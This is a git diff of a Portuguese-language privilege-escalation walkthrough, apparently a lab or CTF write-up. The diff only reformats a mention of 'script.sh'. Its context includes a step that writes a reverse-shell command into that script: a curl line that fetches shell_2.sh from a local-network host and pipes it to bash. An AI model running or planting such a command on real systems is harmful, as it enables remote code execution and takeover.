@@ -24,7 +24,7 @@
 - Por exemplo nesta imagem eu escalei privilégio do meu próprio usuário e consegui, mas não saí do próprio 👤 `www-data`.
 
 ### Solução:
-1. Editar o `📜 `script.sh`` e **inserir um comando de shell reverso**, por exemplo:
+1. Editar o 📜 script.sh e **inserir um comando de shell reverso**, por exemplo:
    ```bash
    📡 `  curl http://192.168.100.168:8000/shell_2.sh | bash  `
    ```
